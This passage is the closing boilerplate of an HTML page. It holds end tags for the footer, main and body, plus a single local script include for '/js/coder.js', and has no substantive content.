    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
